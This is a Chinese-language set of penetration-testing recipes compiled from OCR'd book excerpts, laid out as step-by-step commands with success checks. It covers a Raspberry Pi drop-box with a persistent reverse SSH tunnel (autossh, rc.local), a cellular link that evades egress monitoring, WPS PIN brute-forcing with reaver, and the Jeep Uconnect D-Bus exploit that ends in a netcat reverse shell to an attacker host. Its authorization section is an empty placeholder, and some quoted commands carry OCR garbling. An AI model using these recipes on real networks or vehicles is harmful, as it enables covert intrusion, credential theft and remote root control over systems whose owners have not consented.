# 硬件与物联网安全 · OCR 增补：可执行配方与排障

> 本卡由扫描件 OCR 后提取的 **5 个候选单元**按类型聚合而成，逐字引用、执行步骤、失败模式、书内案例均原样保留自 `candidates/ocr-batch-*.md`。这一批是「已提取、按类型归集」的增补材料，与同目录其他能力卡的三重验证 + 人工聚类流程不同，故单独标注，不冒充正式聚类卡。

## R — 原文 (Reading)

> `root@pwnpi:~# ssh -NfR 10000:localhost:22 mx@www.9lduofanli.com -p22` [OCR: 域名 9lduofanli 原文如此，应为 91duofanli]
>   > `bin/su -c '/usr/bin/autossh -M 5678 -NR 10000:localhost:22 mx@   -9lduofanli.com -p22 &'`（写入 `/etc/rc.local`）
>
> — 《基于树莓派的渗透测试》· 第 23–26 页"SSH Tunnel""SSH Tunnel-AutoSSH"

> "(7)3G/4G上网卡" 与 "(8)无线网卡 (支持监听模式)" 列为树莓派摆渡设备必备项；"利用3G/4G信号接人互联网" [OCR: "接人"应为"接入"]
>
> — 《基于树莓派的渗透测试》· 第 16 页硬件清单 + 第 27 页"利用3G/4G信号接入互联网"

> `airmon-ng start wlan0`
>   > `wash -i mon0 —C` [OCR: "—C"应为"-C"]
>   > `nohup sudo reaver -i monO -b 00:00:00:00:00:00 -a -S —-N -v -d2 -t 5 -c 11 -o fbi &` [OCR: "monO""—-N""fbi"原文如此]
>
> — 《基于树莓派的渗透测试》· 第 35 页"wpa/wpa2 无线密码破解"

> `wpa_passphrase TEST "60987654321" > /etc/wpa_supplicant/wpa_supplicant.conf`
>   > `echo "auto wlan" >> /etc/network/interfaces` [OCR: 此处原文 wlan® 系 wlan0 的 OCR 误识]
>   > `echo "iface wlan® inet dhcp" >> /etc/network/interfaces`
>   > `echo "pre-up wpa_supplicant -Dwext -i wlan® -c /etc/wpa_supplicant/wpa_supplicant.conf -B" >> /etc/network`
>   > `service networking restart`
>
> — 《基于树莓派的渗透测试》· 第 34 页"wifi.sh"

> "D-Bus 本可以要求认证，但是在车机上却允许匿名登录: telnet 192.168.5.1 6667 / AUTH ANONYMOUS / OK 4943a53752f52f82a9ea4e6e00000001 / BEGIN"
>   > "实际上'NavTrailService'服务提供了一个叫'execute'的方法，这个方法就是用于执行任意 shell 命令的。"
>   > `print playerengine_iface.Invoke('execute','{"cmd":"netcat -1 -p 6666 | /bin/sh | netcat 192.168.5.109 6666"}')` [OCR: `-1` 应为 `-l`]
>
> — 《智能汽车安全攻防大揭秘》· 第 7.6.4 与 7.7 节

## I — 方法论骨架 (Interpretation)

**用 SSH 反向隧道 + AutoSSH + rc.local 三重持久化暴露内网** — 单次 `ssh -NfR` 在网络抖动后会断开且不自动重建。AutoSSH 的 `-M 5678` 监测端口周期性发探测包，发现隧道死掉就自动重连。把 AutoSSH 命令写进 `/etc/rc.local`（用 `bin/su -c` 以 root 启动并 `&` 后台化）后，每次树莓派上电都会自动重建隧道。三层叠加：反向转发提供通道、AutoSSH 保证通道存活、rc.local 保证设备重启后通道自动恢复。

**让树莓派经 3G/4G 上网卡直连外网绕过内网出口管控** — 当目标内网对出站做严格管控（仅允许特定 IP/端口、强制走代理、禁用外联），树莓派若依赖内网出口则反向隧道永远建不起来。用一张 3G/4G 上网卡直连运营商蜂窝网，使树莓派拥有独立于目标内网的外联通道。这条通道与内网物理隔离，目标内网的 IDS/防火墙看不到任何外联流量，反向隧道因此可稳定建立。

**用 reaver + wash 对 WPS 漏洞 AP 做暴力破解** — WPA/WPA2 PSK 自身强度足够时无法在合理时间内爆破，但若 AP 开启了 WPS（Wi-Fi Protected Setup），reaver 可针对 WPS 的 PIN 码缺陷（PIN 仅 8 位且最后一位为校验位，实际 7 位；前半 4 位与后半 3 位可分两次爆破）进行在线暴力破解。`wash` 先扫描附近 AP 是否开启 WPS，`reaver` 再对目标 BSSID 发起 PIN 爆破，一旦 PIN 被破解，reaver 会从 AP 反推出真实 WPA PSK。`nohup` + `&` 让爆破在后台持续运行，`-d2 -t 5` 控制每次尝试间隔与超时。

**用 wpa_passphrase + interfaces 脚本化连接已知 SSID/密码** — 树莓派摆渡后需要快速接入目标 Wi-Fi（已知 SSID 与密码）。手工用 `wpa_supplicant.conf` 编辑易错，`wpa_passphrase` 可把明文密码直接生成 wpa_supplicant 配置文件。再把这些配置写入 `/etc/network/interfaces` 并 `service networking restart`，使树莓派开机自动连接该 SSID。这条链路是反向隧道（CU-OCR1-02）能工作的前提。

**通过 D-Bus over IP 匿名调用 NavTrailService.execute 拿 Jeep root shell** — Jeep Uconnect 的 QNX 系统把 D-Bus 守护进程绑到了 6667 端口（绑到所有接口，含蜂窝网），且配置为允许 `AUTH ANONYMOUS` 匿名登录，无需任何凭据。攻击者接入 D-Bus 后可枚举所有 `com.harman.service.*` 服务并调用其方法。`NavTrailService` 服务暴露了一个名为 `execute` 的方法，参数是 JSON `{"cmd":"..."}`，功能就是执行任意 shell 命令。这是一条零日级别的远程 root 命令执行链：连接 D-Bus → 调用 `execute` → netcat 反向 shell。即使没有 `execute`，`rmTrack` 方法还存在命令注入（`os.execute("rm\"" .. params.filename .. "\"")`）作为兜底。

## A1 — 应用示例 (Application Example)

### 示例 1: 用 SSH 反向隧道 + AutoSSH + rc.local 三重持久化暴露内网
- **类型与来源**: 【recipe】《基于树莓派的渗透测试_ocr.txt》· 第 23–26 页"SSH Tunnel""SSH Tunnel-AutoSSH"
- **问题/输入**: 外网跳板主机 sshd 端口 22；autossh 二进制路径（书中为 `/usr/bin/autossh`）；rc.local 在当前 systemd 发行版中仍生效（如不生效需改用 systemd unit）
- **方法论的使用**: 单次 `ssh -NfR` 在网络抖动后会断开且不自动重建。AutoSSH 的 `-M 5678` 监测端口周期性发探测包，发现隧道死掉就自动重连。把 AutoSSH 命令写进 `/etc/rc.local`（用 `bin/su -c` 以 root 启动并 `&` 后台化）后，每次树莓派上电都会自动重建隧道。三层叠加：反向转发提供通道、AutoSSH 保证通道存活、rc.local 保证设备重启后通道自动恢复。
- **结果**: 【亲历】作者在 pwnpi 的 `/etc/rc.local` 中同时配置了 `reverse-vne`、`reverse-netcat`、`autossh` 三条命令做冗余持久化

### 示例 2: 让树莓派经 3G/4G 上网卡直连外网绕过内网出口管控
- **类型与来源**: 【recipe】《基于树莓派的渗透测试_ocr.txt》· 第 16 页硬件清单 + 第 27 页"利用3G/4G信号接入互联网"
- **问题/输入**: 目标位置有 3G/4G 信号覆盖；上网卡已被运营商激活；树莓派供电稳定（书中硬件清单标注"输出电压5V"）
- **方法论的使用**: 当目标内网对出站做严格管控（仅允许特定 IP/端口、强制走代理、禁用外联），树莓派若依赖内网出口则反向隧道永远建不起来。用一张 3G/4G 上网卡直连运营商蜂窝网，使树莓派拥有独立于目标内网的外联通道。这条通道与内网物理隔离，目标内网的 IDS/防火墙看不到任何外联流量，反向隧道因此可稳定建立。
- **结果**: 【亲历】作者在硬件清单中把 3G/4G 上网卡列为"必备"，与无线监听网卡并列；第 27 页用截图展示树莓派通过 3G/4G 信号接入互联网

### 示例 3: 用 reaver + wash 对 WPS 漏洞 AP 做暴力破解
- **类型与来源**: 【recipe】《基于树莓派的渗透测试_ocr.txt》· 第 35 页"wpa/wpa2 无线密码破解"
- **问题/输入**: 支持监听模式的无线网卡（书中硬件清单第 8 项明确要求）；目标 AP 开启了 WPS；目标 AP 未启用 WPS 锁定（lockout）或可绕过
- **方法论的使用**: WPA/WPA2 PSK 自身强度足够时无法在合理时间内爆破，但若 AP 开启了 WPS（Wi-Fi Protected Setup），reaver 可针对 WPS 的 PIN 码缺陷（PIN 仅 8 位且最后一位为校验位，实际 7 位；前半 4 位与后半 3 位可分两次爆破）进行在线暴力破解。`wash` 先扫描附近 AP 是否开启 WPS，`reaver` 再对目标 BSSID 发起 PIN 爆破，一旦 PIN 被破解，reaver 会从 AP 反推出真实 WPA PSK。`nohup` + `&` 让爆破在后台持续运行，`-d2 -t 5` 控制每次尝试间隔与超时。
- **结果**: 【亲历】作者在第 35 页给出 reaver 命令行截图作为"wpa/wpa2 无线密码破解"的标准做法

### 示例 4: 用 wpa_passphrase + interfaces 脚本化连接已知 SSID/密码
- **类型与来源**: 【recipe】《基于树莓派的渗透测试_ocr.txt》· 第 34 页"wifi.sh"
- **问题/输入**: 已知目标 SSID 与密码（通过 reaver 破解见 CU-OCR1-05 或社工获取）；树莓派已识别无线网卡；Debian/Kali 系 network/interfaces 风格（systemd-networkd 版本不适用）
- **方法论的使用**: 树莓派摆渡后需要快速接入目标 Wi-Fi（已知 SSID 与密码）。手工用 `wpa_supplicant.conf` 编辑易错，`wpa_passphrase` 可把明文密码直接生成 wpa_supplicant 配置文件。再把这些配置写入 `/etc/network/interfaces` 并 `service networking restart`，使树莓派开机自动连接该 SSID。这条链路是反向隧道（CU-OCR1-02）能工作的前提。
- **结果**: 【亲历】作者第 34 页用 nano 编辑 `wifi.sh` 把上述命令脚本化，作为树莓派接入内网 Wi-Fi 的标准做法

### 示例 5: 通过 D-Bus over IP 匿名调用 NavTrailService.execute 拿 Jeep root shell
- **类型与来源**: 【recipe】《智能汽车安全攻防大揭秘_ocr.txt》· 第 7.6.4 与 7.7 节（约第 4145–4433 行）
- **问题/输入**: 网络可达车机 6667 端口（Wi-Fi 已开启 / 攻击者在 Sprint 网络内 / 通过飞蜂窝）；Python + `dbus` 库；攻击者主机有公网/可达 IP 接收反向 shell
- **方法论的使用**: Jeep Uconnect 的 QNX 系统把 D-Bus 守护进程绑到了 6667 端口（绑到所有接口，含蜂窝网），且配置为允许 `AUTH ANONYMOUS` 匿名登录，无需任何凭据。攻击者接入 D-Bus 后可枚举所有 `com.harman.service.*` 服务并调用其方法。`NavTrailService` 服务暴露了一个名为 `execute` 的方法，参数是 JSON `{"cmd":"..."}`，功能就是执行任意 shell 命令。这是一条零日级别的远程 root 命令执行链：连接 D-Bus → 调用 `execute` → netcat 反向 shell。即使没有 `execute`，`rmTrack` 方法还存在命令注入（`os.execute("rm\"" .. params.filename .. "\"")`）作为兜底。
- **结果**: 【转述】Charlie Miller 与 Chris Valasek 演示了用 4 行 Python 在未改装 Jeep 上拿到 root shell，并指出这是"在不认证的情况下执行代码最好的途径"

## A2 — 相邻能力 (Adjacency)

1. 出现「autossh -M 反向 ssh 持久化」这类信号时，回到本卡查对应单元的方法与判据。
2. 出现「rc.local 启动 reverse ssh」这类信号时，回到本卡查对应单元的方法与判据。
3. 出现「ssh -NfR 10000:localhost:22」这类信号时，回到本卡查对应单元的方法与判据。
4. 出现「persistent reverse tunnel raspberry pi」这类信号时，回到本卡查对应单元的方法与判据。
5. 出现「内网禁止出站」这类信号时，回到本卡查对应单元的方法与判据。
6. 出现「physical dropbox cellular modem」这类信号时，回到本卡查对应单元的方法与判据。

语言信号：「autossh -M 反向 ssh 持久化」、「rc.local 启动 reverse ssh」、「ssh -NfR 10000:localhost:22」、「persistent reverse tunnel raspberry pi」、「内网禁止出站」、「physical dropbox cellular modem」

本卡为增补材料，正式能力卡请优先读：`device-discovery-exposure-assessment`、`covert-remote-access-chain`。

**相邻区分（原文）**：

- 与普通 `ssh -R` 区别：本方案解决"网络抖动后断开不重连"与"设备重启后隧道不自动恢复"两个持久化问题。与 VPN 反向接入区别：本方案只暴露 22 端口，需要 hop 一步，不做全流量

---
- 与 Wi-Fi 桥接区别：3G/4G 通道绕过目标内网所有出口管控，不依赖目标内网任何资源。与 CU-OCR1-02 的反向隧道互为前提：本单元提供外联物理通道，CU-OCR1-02 在该通道上建隧道

---
- 与字典爆破 WPA 握手包（aircrack-ng + 字典）区别：reaver 不需要捕获握手包，针对 WPS 而非 PSK。与 CU-OCR1-06 区别：本单元是暴力破解 WPS；CU-OCR1-06 是已知密码后用脚本自动配网

---
- 与 CU-OCR1-05 区别：本单元是在已知密码情况下让树莓派自动配网，不涉及破解。与 nmcli 方案区别：本方案禁用了 NetworkManager（书中 `service network-manager stop`），适合无头部署

---
- 与 CU-OCR1-13（Wi-Fi 密码爆破）区别：本单元在已接入车机网络后利用应用层漏洞。与 CU-OCR1-15（V850 固件升级）区别：本单元拿 OMAP root，CU-OCR1-15 在此基础上跨芯片发 CAN 帧

---

## E — 执行步骤 (Execution)

### 用 SSH 反向隧道 + AutoSSH + rc.local 三重持久化暴露内网

1. 在树莓派生成密钥并免密推到外网主机：`ssh-keygen -t rsa` → `ssh-copy-id mx@<外网主机>` → 判据：`ssh mx@<外网主机>` 无需密码即可登录
  2. 手动验证反向隧道：`ssh -NfR 10000:localhost:22 mx@<外网主机> -p22` → 判据：外网主机 `ssh 127.0.0.1 -p10000` 能进树莓派
  3. 在外网主机安装 autossh（或在树莓派本地：`apt install autossh`）→ 判据：`which autossh` 有输出
  4. 把 `bin/su -c '/usr/bin/autossh -M 5678 -NR 10000:localhost:22 mx@<外网主机> -p22 &'` 写入 `/etc/rc.local` → 判据：`cat /etc/rc.local` 可见该行且未被注释
  5. 重启树莓派验证开机自启 → 判据：重启后外网主机 10000 端口自动出现并可直接 ssh

### 让树莓派经 3G/4G 上网卡直连外网绕过内网出口管控

1. 准备硬件：树莓派 B+ 及以上、Micro SD（≥4G）、Mini USB 供电（5V）、3G/4G 上网卡 → 判据：上网卡被树莓派 `lsusb` 识别
  2. 烧写 Pwn Pi 或 Kali 镜像：用 Win32DiskImager 把 `kali-1.1.1-rpi.img` 写入 SD 卡 → 判据：`dmesg | tail` 显示 SD 卡分区挂载
  3. 配置 3G/4G 拨号：在 Kali/Pwn Pi 中用 `wvdial` 或厂商工具建立 ppp0 接口 → 判据：`ifconfig ppp0` 显示已分配运营商 IP
  4. 验证外网可达：`curl ifconfig.me` 返回公网 IP → 判据：返回的 IP 不属于目标内网段
  5. 在 ppp0 上启动反向 SSH 隧道（见 CU-OCR1-02）→ 判据：外网主机 ssh 10000 端口可达树莓派

### 用 reaver + wash 对 WPS 漏洞 AP 做暴力破解

1. 杀掉影响监听的进程：`airmon-ng check kill`（书中用 `service network-manager stop`）→ 判据：`iwconfig` 显示无管理进程占用 wlan0
  2. 启动监听模式：`airmon-ng start wlan0` → 判据：`iwconfig` 出现 `mon0` 接口
  3. 扫描开启 WPS 的 AP：`wash -i mon0 -C` → 判据：输出列表中含目标 BSSID 与 ESSID
  4. 后台启动 reaver 爆破：`nohup sudo reaver -i mon0 -b <目标BSSID> -a -S -N -v -d2 -t 5 -c <channel> -o fbi &` → 判据：`tail -f` reaver 日志可见 PIN 尝试进度
  5. 等 reaver 反推 PSK → 判据：日志出现 `WPA PSK: "xxxx"`

### 用 wpa_passphrase + interfaces 脚本化连接已知 SSID/密码

1. 生成 wpa_supplicant.conf：`wpa_passphrase <SSID> "<PASSWORD>" > /etc/wpa_supplicant/wpa_supplicant.conf` → 判据：文件内出现 `psk=` 行
  2. 重写 interfaces：依次 `echo` 写入 `auto lo`、`iface lo inet loopback`、`auto eth0`、`iface eth0 inet dhcp`、`auto wlan0`、`iface wlan0 inet dhcp` → 判据：`cat /etc/network/interfaces` 包含所有行
  3. 加入 pre-up 启动 wpa_supplicant：`echo "pre-up wpa_supplicant -Dwext -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf -B" >> /etc/network/interfaces` → 判据：行存在
  4. 重启网络：`service networking restart` → 判据：`ifconfig wlan0` 获得 DHCP IP
  5. 验证外网可达：`ping 8.8.8.8` → 判据：通

### 通过 D-Bus over IP 匿名调用 NavTrailService.execute 拿 Jeep root shell

1. 探测目标：`telnet <车机IP> 6667`（车机 IP：Wi-Fi 入口 192.168.5.1，蜂窝入口 21.x.x.x 或 25.x.x.x）→ 判据：返回 `ERROR "Unknown command"`（确认是 D-Bus over IP 而非 IRC）
  2. 匿名登录：发送 `AUTH ANONYMOUS` → 判据：返回 `OK <hex>` 后 `BEGIN`
  3. 用 Python `dbus.bus.BusConnection("tcp:host=<IP>,port=6667")` 连接 → 判据：bus 对象可用
  4. 获取 `com.harman.service.NavTrailService` 代理对象与 `com.harman.ServiceIpc` 接口 → 判据：`get_object` 不报错
  5. 调用 `Invoke('execute', '{"cmd":"netcat -l -p 6666 | /bin/sh | netcat <attacker_IP> 6666"}')` → 判据：攻击者 6666 端口收到反向 shell
  6. 在 shell 中以 root 权限执行任意命令（车机 QNX 默认 root）→ 判据：`id` 返回 uid=0

### 统一判停条件

- 单元「失败模式」里列出的任一条件成立时停止该路径，换维度重查；
- OCR 文本不可读、引用无法核对时，只作线索，不写入结论；
- 连续三次同类验证无结果时回到攻击面/问题定义重排优先级。

## B — 失效与边界 (Boundary)

- **用 SSH 反向隧道 + AutoSSH + rc.local 三重持久化暴露内网**：`Warning: remote port forwarding failed for listen port 10000` 表示外网主机 10000 已被占用（之前的隧道未释放），需要外网主机侧清理或换端口；书中 rc.local 同时还启动了 `reverse-vne` 与 `reverse-netcat` 两条命令作为冗余，单条失败仍有备份
- **让树莓派经 3G/4G 上网卡直连外网绕过内网出口管控**：蜂窝信号在目标楼宇深处可能不可用，需事先勘测；某些运营商对 ppp0 入站做 NAT，反向隧道方向仍可工作但无法直连树莓派；书中未给出 wvdial 配置细节，需自行按卡型号配置
- **用 reaver + wash 对 WPS 漏洞 AP 做暴力破解**：多数现代 AP 在多次失败 PIN 后会锁定 WPS（5 分钟到 24 小时不等），reaver 需配 `--delay` 与 `--lock-delay` 应对；某些 AP厂商实现了 Pixie-Dust 漏洞可被 `reaver -K` 秒破，但书中未涉及此变体；`-c 11` 必须与目标 AP 实际信道一致，否则收不到握手
- **用 wpa_passphrase + interfaces 脚本化连接已知 SSID/密码**：`-Dwext` 驱动在某些新内核中已弃用，需改用 `nl80211`；interfaces 文件中 `wlan0` 写成 `wlan` 或 `wlan®`（OCR 误识）会导致接口起不来；`service networking restart` 在 systemd 系统中可能需要 `systemctl restart networking`
- **通过 D-Bus over IP 匿名调用 NavTrailService.execute 拿 Jeep root shell**：必须是 Sprint 网络内主机才能 telnet 蜂窝地址，公网任意主机不行（作者明确说明）；Wi-Fi 入口要求车主已开通 Wi-Fi 服务；后续修复版本关闭了匿名 D-Bus 与 `execute` 方法；若 `execute` 被删，可退而用 `rmTrack` 命令注入（`os.execute("rm\"" .. params.filename .. "\"")` 中 `filename` 未过滤）

### 授权与合规边界

> 待补充（用户自行填写）
